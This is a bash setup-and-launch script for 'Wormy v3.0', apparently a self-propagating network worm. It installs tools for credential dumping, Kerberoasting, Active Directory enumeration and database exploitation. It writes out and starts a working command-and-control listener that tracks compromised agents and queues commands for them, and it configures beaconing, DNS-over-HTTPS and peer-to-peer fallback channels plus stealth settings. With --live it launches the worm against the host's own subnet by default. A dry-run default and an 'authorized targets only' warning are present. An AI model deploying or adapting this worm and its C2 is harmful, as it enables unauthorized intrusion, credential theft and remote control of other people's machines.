#!/usr/bin/env bash
# -*- coding: utf-8 -*-
# =============================================================================
# Wormy v3.0 — Self-Contained Setup & Launch (Self-Hosted C2)
# Developed by Ruby570bocadito
#
# USAGE:
#   chmod +x scripts/deploy_kali.sh
#   sudo ./scripts/deploy_kali.sh                  # interactive, dry-run
#   sudo ./scripts/deploy_kali.sh --live            # launch worm now
#   sudo ./scripts/deploy_kali.sh --live --target 192.168.1.0/24
#
# WHAT IT DOES:
#   1. Autodetects THIS machine's IP → becomes the C2
#   2. Installs all system + Python dependencies
#   3. Builds & starts the Go C2 server (WormyC2) on this host
#   4. Patches config.yaml with self-IP as C2
#   5. Validates all worm modules can import correctly
#   6. Runs pre-flight checks (ports, reachability)
#   7. Launches the worm (dry-run by default, --live to attack)
# =============================================================================

set -uo pipefail   # no -e so we keep running even if steps fail

# ─── Colors ─────────────────────────────────────────────────────────────────
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; BOLD='\033[1m'; DIM='\033[2m'; RESET='\033[0m'

# ─── Paths ───────────────────────────────────────────────────────────────────
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
WORM_DIR="$(cd "$SCRIPT_DIR/.." && pwd)"
LOG_FILE="/tmp/wormy_setup_$(date +%Y%m%d_%H%M%S).log"
CONFIG_FILE="$WORM_DIR/configs/config.yaml"
PID_DIR="/tmp/wormy_pids"
mkdir -p "$PID_DIR"

# ─── Defaults ────────────────────────────────────────────────────────────────
DRY_RUN="true"
C2_PORT="8443"
WORM_BEACON_PORT="8444"   # secondary http beacon
P2P_PORT="9999"
TARGET_RANGE=""
STEALTH_LEVEL="3"
START_MSF="false"
SKIP_SYSPACKAGES="false"

# ─── Args ────────────────────────────────────────────────────────────────────
while [[ $# -gt 0 ]]; do
    case "$1" in
        --live)             DRY_RUN="false"       ; shift ;;
        --target)           TARGET_RANGE="$2"      ; shift 2 ;;
        --port)             C2_PORT="$2"           ; shift 2 ;;
        --stealth)          STEALTH_LEVEL="$2"     ; shift 2 ;;
        --with-msf)         START_MSF="true"       ; shift ;;
        --skip-packages)    SKIP_SYSPACKAGES="true"; shift ;;
        --help|-h)
            echo "Usage: sudo $0 [--live] [--target CIDR] [--port PORT] [--with-msf]"
            exit 0 ;;
        *) echo "Unknown arg: $1"; exit 1 ;;
    esac
done

# ─── Helpers ─────────────────────────────────────────────────────────────────
_log()     { echo -e "${CYAN}[*]${RESET} $*" | tee -a "$LOG_FILE"; }
_ok()      { echo -e "${GREEN}[OK]${RESET} $*" | tee -a "$LOG_FILE"; }
_warn()    { echo -e "${YELLOW}[!]${RESET} $*" | tee -a "$LOG_FILE"; }
_err()     { echo -e "${RED}[ERR]${RESET} $*" | tee -a "$LOG_FILE"; }
_sec()     { echo -e "\n${BOLD}${CYAN}━━━ $* ━━━${RESET}" | tee -a "$LOG_FILE"; }
_done()    { echo -e "${GREEN}${BOLD}  ✔  $*${RESET}" | tee -a "$LOG_FILE"; }

# ─── Banner ──────────────────────────────────────────────────────────────────
echo -e "${BOLD}${GREEN}"
cat << 'BANNER'
 __        __
 \ \      / /__  _ __ _ __ ___  _   _
  \ \ /\ / / _ \| '__| '_ ` _ \| | | |
   \ V  V / (_) | |  | | | | | | |_| |
    \_/\_/ \___/|_|  |_| |_| |_|\__, |
                                  |___/
    ML Network Worm v3.0 — Self-Hosted C2 Setup
BANNER
echo -e "${RESET}"

echo -e "  ${DIM}Log file:${RESET}   $LOG_FILE"
echo -e "  ${DIM}Worm dir:${RESET}   $WORM_DIR"
if [[ "$DRY_RUN" == "true" ]]; then
    echo -e "  ${YELLOW}Mode:       DRY RUN (safe — not attacking anything)${RESET}"
else
    echo -e "  ${RED}${BOLD}Mode:       LIVE — will actively scan/attack authorized targets${RESET}"
fi
echo ""

# ─── Step 0: Root check ──────────────────────────────────────────────────────
_sec "Step 0: Privilege check"
if [[ $EUID -ne 0 ]]; then
    _warn "Not running as root — raw sockets (Scapy) and some exploits will be limited"
    _warn "For full capability: sudo ./scripts/deploy_kali.sh"
else
    _ok "Root — raw sockets, Scapy, ICMP all enabled"
fi

# ─── Step 1: Detect own IP (this machine = C2) ───────────────────────────────
_sec "Step 1: Auto-detecting C2 IP (this host)"

# Try multiple methods to get the real non-loopback IP
get_own_ip() {
    # Method 1: route to 8.8.8.8 (works in most cases)
    local ip
    ip=$(ip route get 8.8.8.8 2>/dev/null | grep -oP 'src \K[\d.]+' | head -1)
    if [[ -n "$ip" ]]; then echo "$ip"; return; fi

    # Method 2: first non-loopback inet address
    ip=$(ip -4 addr show scope global | grep -oP 'inet \K[\d.]+' | head -1)
    if [[ -n "$ip" ]]; then echo "$ip"; return; fi

    # Method 3: hostname -I
    ip=$(hostname -I 2>/dev/null | awk '{print $1}')
    if [[ -n "$ip" ]]; then echo "$ip"; return; fi

    echo "127.0.0.1"
}

SELF_IP=$(get_own_ip)
_ok "This host's IP: ${BOLD}${GREEN}$SELF_IP${RESET}"
_ok "C2 will run on: ${BOLD}${GREEN}$SELF_IP:$C2_PORT${RESET}"

# Auto-detect target range from own subnet if not provided
if [[ -z "$TARGET_RANGE" ]]; then
    # Derive /24 from own IP
    SUBNET_BASE=$(echo "$SELF_IP" | cut -d'.' -f1-3)
    TARGET_RANGE="${SUBNET_BASE}.0/24"
    _warn "No --target specified → using own subnet: $TARGET_RANGE"
fi

# ─── Step 2: System packages ─────────────────────────────────────────────────
_sec "Step 2: System packages"

if [[ "$SKIP_SYSPACKAGES" == "false" ]]; then
    REQUIRED_PKGS=(
        python3 python3-pip python3-dev
        nmap git curl wget
        libssl-dev libffi-dev build-essential
        libpq-dev              # PostgreSQL
        freetds-dev            # MSSQL (pymssql)
        golang-go              # Go C2 server
        netcat-openbsd         # connectivity checks
    )

    _log "Updating package lists..."
    apt-get update -qq >> "$LOG_FILE" 2>&1 || _warn "apt update failed (continuing)"

    for pkg in "${REQUIRED_PKGS[@]}"; do
        if dpkg -s "$pkg" &>/dev/null 2>&1; then
            _ok "  $pkg ✔"
        else
            _log "  Installing $pkg..."
            apt-get install -y -qq "$pkg" >> "$LOG_FILE" 2>&1 \
                && _ok "  $pkg installed" \
                || _warn "  $pkg failed (non-fatal)"
        fi
    done
else
    _warn "Skipping system packages (--skip-packages)"
fi

# ─── Step 3: Python dependencies ─────────────────────────────────────────────
_sec "Step 3: Python dependencies"

cd "$WORM_DIR"
pip3 install -q --upgrade pip >> "$LOG_FILE" 2>&1

# Core requirements
if [[ -f requirements.txt ]]; then
    _log "Installing requirements.txt..."
    pip3 install -q -r requirements.txt >> "$LOG_FILE" 2>&1 \
        && _ok "requirements.txt installed" \
        || _warn "Some requirements failed — check $LOG_FILE"
fi

# Enterprise extras (critical for real engagement)
declare -A EXTRAS=(
    [impacket]="SMB pivot / WMI exec / secretsdump / Kerberoast"
    [paramiko]="SSH session pool + pivot"
    [scapy]="Raw TCP-SYN scanner"
    [ldap3]="Active Directory LDAP enumeration"
    [dnspython]="DNS-over-HTTPS C2 channel"
    [pymssql]="MSSQL exploitation + xp_cmdshell"
    [pymongo]="MongoDB exploitation"
    [psycopg2-binary]="PostgreSQL exploitation"
    [pymysql]="MySQL exploitation"
    [cryptography]="C2 AES-GCM encryption"
    [requests]="HTTP C2 beaconing"
    [rich]="CLI dashboard + reports"
    [bloodhound]="AD BloodHound data export"
)

for pkg in "${!EXTRAS[@]}"; do
    import_name="${pkg//-/_}"
    import_name="${import_name%%[<>=]*}"
    if python3 -c "import $import_name" &>/dev/null 2>&1; then
        _ok "  $pkg ✔  ${DIM}(${EXTRAS[$pkg]})${RESET}"
    else
        _log "  Installing $pkg...  ${DIM}(${EXTRAS[$pkg]})${RESET}"
        pip3 install -q "$pkg" >> "$LOG_FILE" 2>&1 \
            && _ok "  $pkg installed" \
            || _warn "  $pkg FAILED — ${EXTRAS[$pkg]} unavailable"
    fi
done

# ─── Step 4: Build & start Go C2 server (this host = C2) ────────────────────
_sec "Step 4: C2 Server (self-hosted on $SELF_IP:$C2_PORT)"

C2_SERVER_DIR="$WORM_DIR/../WormyC2"
C2_BINARY="/tmp/wormy_c2_server"
C2_STARTED="false"

if [[ -d "$C2_SERVER_DIR" ]]; then
    _log "Building Go C2 server from $C2_SERVER_DIR..."
    (cd "$C2_SERVER_DIR" && go build -o "$C2_BINARY" ./cmd/server/ >> "$LOG_FILE" 2>&1) \
        && _ok "C2 binary built: $C2_BINARY" \
        || _warn "Go build failed — using Python fallback C2"
fi

# Python fallback C2 (lightweight HTTPS beacon listener)
FALLBACK_C2_SCRIPT="/tmp/wormy_c2_listener.py"
cat > "$FALLBACK_C2_SCRIPT" << 'PYEOF'
#!/usr/bin/env python3
"""Minimal C2 beacon listener — receives agent beacons and queues commands."""
import http.server, ssl, json, os, threading, time, base64
from datetime import datetime

PORT      = int(os.environ.get("C2_PORT", "8443"))
CERT_FILE = "/tmp/wormy_c2.crt"
KEY_FILE  = "/tmp/wormy_c2.key"
AGENTS    = {}
CMD_QUEUE = {}

class C2Handler(http.server.BaseHTTPRequestHandler):
    def log_message(self, fmt, *args): pass  # silent

    def _json(self, data, code=200):
        body = json.dumps(data).encode()
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", len(body))
        self.end_headers()
        self.wfile.write(body)

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body   = json.loads(self.rfile.read(length)) if length else {}
        agent  = body.get("agent_id", "unknown")
        AGENTS[agent] = {"last_seen": datetime.utcnow().isoformat(), "data": body}
        cmd = CMD_QUEUE.pop(agent, None)
        print(f"\033[32m[BEACON]\033[0m {agent} @ {datetime.utcnow().strftime('%H:%M:%S')} | "
              f"ip={body.get('ip','?')} pwned={body.get('pwned_count',0)}")
        self._json({"status": "ok", "command": cmd} if cmd else {"status": "ok"})

    def do_GET(self):
        if self.path == "/health":
            self._json({"status": "up", "agents": len(AGENTS)})
        elif self.path == "/agents":
            self._json(AGENTS)
        else:
            self._json({"status": "wormy-c2"})

def gen_cert():
    try:
        os.system(f"openssl req -x509 -newkey rsa:2048 -keyout {KEY_FILE} "
                  f"-out {CERT_FILE} -days 365 -nodes "
                  f"-subj '/CN=wormy-c2' >> /tmp/wormy_c2_cert.log 2>&1")
        return os.path.exists(CERT_FILE)
    except Exception:
        return False

if __name__ == "__main__":
    print(f"\033[1m\033[36m[C2] Starting on :{PORT}\033[0m")
    server = http.server.HTTPServer(("0.0.0.0", PORT), C2Handler)
    if gen_cert():
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain(CERT_FILE, KEY_FILE)
        server.socket = ctx.wrap_socket(server.socket, server_side=True)
        print(f"\033[32m[C2] HTTPS listener ready on :{PORT}\033[0m")
    else:
        print(f"\033[33m[C2] HTTP listener (no TLS) on :{PORT}\033[0m")
    server.serve_forever()
PYEOF

# Kill any existing C2 listener
pkill -f "wormy_c2" 2>/dev/null || true

# Start C2 (Go binary if built, else Python fallback)
if [[ -f "$C2_BINARY" ]]; then
    C2_PORT=$C2_PORT "$C2_BINARY" &
    echo $! > "$PID_DIR/c2_server.pid"
    _ok "Go C2 server started (PID=$(cat $PID_DIR/c2_server.pid))"
else
    C2_PORT=$C2_PORT python3 "$FALLBACK_C2_SCRIPT" &
    echo $! > "$PID_DIR/c2_server.pid"
    _ok "Python C2 listener started (PID=$(cat $PID_DIR/c2_server.pid)) on $SELF_IP:$C2_PORT"
fi
sleep 2

# Verify C2 is responding
if curl -sk "https://$SELF_IP:$C2_PORT/health" &>/dev/null \
   || curl -sk "http://$SELF_IP:$C2_PORT/health" &>/dev/null; then
    _done "C2 is UP and responding"
    C2_STARTED="true"
else
    _warn "C2 not responding yet — may take a few seconds"
fi

# ─── Step 5: Patch config.yaml with self-IP as C2 ───────────────────────────
_sec "Step 5: Patching config.yaml"

if [[ -f "$CONFIG_FILE" ]]; then
    # Backup original
    cp "$CONFIG_FILE" "${CONFIG_FILE}.bak"

    # Update C2 server to this host
    sed -i "s|c2_server:.*|c2_server: \"$SELF_IP\"|g"    "$CONFIG_FILE"
    sed -i "s|c2_port:.*|c2_port: $C2_PORT|g"            "$CONFIG_FILE"
    sed -i "s|target_range:.*|target_range: \"$TARGET_RANGE\"|g" "$CONFIG_FILE"

    _ok "config.yaml patched:"
    _ok "  c2_server  → $SELF_IP"
    _ok "  c2_port    → $C2_PORT"
    _ok "  target     → $TARGET_RANGE"
else
    # Create minimal config if missing
    _warn "config.yaml not found — creating minimal config"
    mkdir -p "$WORM_DIR/configs"
    cat > "$CONFIG_FILE" << YAMLEOF
# Wormy v3.0 — Auto-generated config
c2:
  c2_server: "$SELF_IP"
  c2_port: $C2_PORT
  beacon_interval: 60
  jitter: 0.3
  use_doh: true
  use_domain_fronting: false
  use_p2p: true

network:
  target_range: "$TARGET_RANGE"
  max_threads: 50
  scan_timeout: 3
  max_propagation_depth: 3
  excluded_hosts: []

ml:
  use_pretrained: false
  rl_agent_path: "saved/rl_agent"

stealth:
  level: $STEALTH_LEVEL
  kill_switch_file: "STOP_WORMY_NOW"
YAMLEOF
    _ok "Minimal config.yaml created"
fi

# ─── Step 6: Optional Metasploit RPC ────────────────────────────────────────
_sec "Step 6: Metasploit RPC"

if [[ "$START_MSF" == "true" ]]; then
    if command -v msfrpcd &>/dev/null; then
        MSF_PASS="wormy$(openssl rand -hex 4)"
        msfrpcd -P "$MSF_PASS" -a 127.0.0.1 -p 55553 -S >> "$LOG_FILE" 2>&1 &
        echo $! > "$PID_DIR/msfrpcd.pid"
        sleep 3
        # Patch config with MSF creds
        echo -e "\nmetasploit:\n  enabled: true\n  host: \"127.0.0.1\"\n  port: 55553\n  password: \"$MSF_PASS\"" >> "$CONFIG_FILE"
        _ok "Metasploit RPC started (PID=$(cat $PID_DIR/msfrpcd.pid)) — pass: $MSF_PASS"
    else
        _warn "Metasploit not found — skip (install from rapid7 or use Kali)"
    fi
else
    _warn "Metasploit not started (add --with-msf to enable CVE exploits)"
fi

# ─── Step 7: Module import validation ───────────────────────────────────────
_sec "Step 7: Worm module validation"

python3 -X utf8 << 'PYEOF' 2>&1 | tee -a "$LOG_FILE"
import sys, os
sys.path.insert(0, os.path.expanduser(os.environ.get("WORM_DIR", ".")))

checks = [
    ("utils.logger",                        "logger"),
    ("scanning.enterprise_scanner",         "EnterpriseScanner"),
    ("exploits.enterprise_password_engine", "EnterprisePasswordEngine"),
    ("evasion.enterprise_evasion",          "EnterpriseEvasionEngine"),
    ("evasion.advanced_polymorphic",        "AdvancedPolymorphicEngine"),
    ("c2.resilient_c2",                     "ResilientC2Engine"),
    ("core.wave_propagation",               "WavePropagationEngine"),
    ("core.agent_controller",               "AgentController"),
    ("core.advanced_self_healing",          "AdvancedSelfHealingEngine"),
    ("exploits.active_directory",           "ActiveDirectoryAttacker"),
    ("exploits.modules.mssql_exploit",      "MSSQL_Exploit"),
]

passed, failed = 0, 0
for mod, cls in checks:
    try:
        m = __import__(mod, fromlist=[cls])
        getattr(m, cls)
        print(f"  \033[32m[OK]\033[0m   {mod}.{cls}")
        passed += 1
    except Exception as e:
        print(f"  \033[31m[FAIL]\033[0m {mod}: {e}")
        failed += 1

print(f"\n  Modules: {passed} OK / {failed} FAILED")
PYEOF

# ─── Step 8: Pre-flight network check ───────────────────────────────────────
_sec "Step 8: Pre-flight network check"

# Ports to open in firewall
_log "Opening firewall ports..."
ufw allow "$C2_PORT"/tcp >> "$LOG_FILE" 2>&1 \
    && _ok "ufw: port $C2_PORT/tcp allowed" \
    || _warn "ufw not available or failed (iptables may need manual rules)"

# Test own C2 endpoint
if curl -sk --max-time 3 "https://$SELF_IP:$C2_PORT/health" &>/dev/null \
   || curl -sk --max-time 3 "http://$SELF_IP:$C2_PORT/health" &>/dev/null; then
    _done "Self C2 endpoint responding"
else
    _warn "Self C2 not responding — check port $C2_PORT is open"
fi

# DoH test
if curl -sf --max-time 3 "https://1.1.1.1/dns-query?name=google.com&type=A" \
        -H "Accept: application/dns-json" &>/dev/null; then
    _ok "DoH fallback channel (1.1.1.1) reachable"
else
    _warn "DoH unreachable — P2P gossip will be primary fallback"
fi

# Target reachability
GATEWAY=$(echo "$TARGET_RANGE" | cut -d'/' -f1 | sed 's/\.[0-9]*$/.1/')
if ping -c1 -W2 "$GATEWAY" &>/dev/null; then
    _ok "Target network $TARGET_RANGE reachable (gateway $GATEWAY responds)"
else
    _warn "Gateway $GATEWAY not responding — may be firewalled (ICMP blocked)"
fi

# ─── Step 9: Remove old kill switch, setup fresh ────────────────────────────
_sec "Step 9: Kill switch"
KS="$WORM_DIR/STOP_WORMY_NOW"
rm -f "$KS"
_ok "Kill switch ready — stop the worm anytime:"
_ok "  ${BOLD}touch $KS${RESET}"

# ─── Step 10: Launch ────────────────────────────────────────────────────────
_sec "Step 10: Launch"

WORM_LOG="/tmp/wormy_run_$(date +%Y%m%d_%H%M%S).log"

if [[ "$DRY_RUN" == "false" ]]; then
    echo ""
    echo -e "${RED}${BOLD}  ⚠  LIVE MODE — Authorized targets only. You have 10 seconds to abort.${RESET}"
    for i in $(seq 10 -1 1); do
        echo -ne "\r     ${YELLOW}Launching in $i...${RESET}  "
        sleep 1
    done
    echo ""

    WORM_DIR=$WORM_DIR python3 -X utf8 "$WORM_DIR/worm_core.py" \
        --config "$CONFIG_FILE" \
        >> "$WORM_LOG" 2>&1 &
    WORM_PID=$!
    echo $WORM_PID > "$PID_DIR/worm.pid"
    sleep 2

    if kill -0 "$WORM_PID" 2>/dev/null; then
        _done "Worm running (PID=$WORM_PID)"
    else
        _err "Worm exited unexpectedly — check: $WORM_LOG"
    fi
else
    _warn "DRY RUN — worm NOT launched. Run with --live when ready:"
    _warn "  sudo $0 --live --target $TARGET_RANGE"
fi

# ─── Summary ─────────────────────────────────────────────────────────────────
echo ""
echo -e "${BOLD}${GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo -e "${BOLD}  WORMY v3.0 — SETUP COMPLETE${RESET}"
echo -e "${BOLD}${GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo ""
echo -e "  ${CYAN}C2 Server:${RESET}    $SELF_IP:$C2_PORT (this host)"
echo -e "  ${CYAN}Target:${RESET}       $TARGET_RANGE"
echo -e "  ${CYAN}Stealth:${RESET}      Level $STEALTH_LEVEL"
echo -e "  ${CYAN}Deploy log:${RESET}   $LOG_FILE"
[[ -f "$WORM_LOG" ]] && echo -e "  ${CYAN}Worm log:${RESET}     $WORM_LOG"
echo ""
echo -e "  ${BOLD}Useful commands:${RESET}"
echo -e "    ${DIM}# Live dashboard${RESET}"
echo -e "    python3 $WORM_DIR/monitoring/cli_monitor.py"
echo ""
echo -e "    ${DIM}# Watch beacon hits on C2${RESET}"
echo -e "    curl -sk http://$SELF_IP:$C2_PORT/agents | python3 -m json.tool"
echo ""
echo -e "    ${DIM}# Kill switch${RESET}"
echo -e "    touch $KS"
echo ""
echo -e "    ${DIM}# Stop C2${RESET}"
echo -e "    kill \$(cat $PID_DIR/c2_server.pid 2>/dev/null)"
echo ""
[[ "$DRY_RUN" == "true" ]] && echo -e "  ${YELLOW}Mode: DRY RUN — use --live to attack${RESET}" \
                            || echo -e "  ${RED}${BOLD}Mode: LIVE — worm is running${RESET}"
echo ""
